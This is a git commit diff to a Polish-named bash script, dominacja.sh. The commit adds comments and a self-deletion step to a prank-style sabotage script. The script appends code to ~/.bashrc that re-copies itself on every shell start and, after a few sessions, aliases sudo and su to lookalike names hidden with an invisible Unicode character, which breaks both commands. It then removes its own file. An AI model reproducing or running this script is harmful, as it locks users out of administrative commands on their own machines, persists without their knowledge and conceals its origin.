555b40f83f08a59959f5b9c30bd7215c84161139
XXXDominatorXXX <101982442+XXXDominatorXXX@users.noreply.github.com>
2022-03-20 16:48:35 +0100

    Komentarze i Auto Destrukcja

--- dominacja.sh
+++ dominacja.sh
@@ -1,3 +1,4 @@
+# Start Counting
 echo 'LOL=1 ' >> ~/.bashrc
 echo 'if [ $LOL -gt 3 ]' >> ~/.bashrc
 echo 'then' >> ~/.bashrc
@@ -6,9 +7,14 @@ echo 'alias su=s‎u' >> ~/.bashrc
 echo 'fi' >> ~/.bashrc
 echo 'LOL=$(($LOL+1))' >> ~/.bashrc
 
+# Clone script on every console execution
+# For Fourth User sudo and su will stop working
 echo "echo 'if [ \$LOL -gt 3 ]' >> ~/.bashrc" >> ~/.bashrc
 echo "echo 'then' >> ~/.bashrc" >> ~/.bashrc
 echo "echo 'alias sudo=sud‎o' >> ~/.bashrc" >> ~/.bashrc
 echo "echo 'alias su=s‎u' >> ~/.bashrc" >> ~/.bashrc
 echo "echo 'fi' >> ~/.bashrc" >> ~/.bashrc
 echo "echo 'LOL=\$((\$LOL+1))' >> ~/.bashrc" >> ~/.bashrc
+
+#Auto Destruction
+rm dominacja.sh
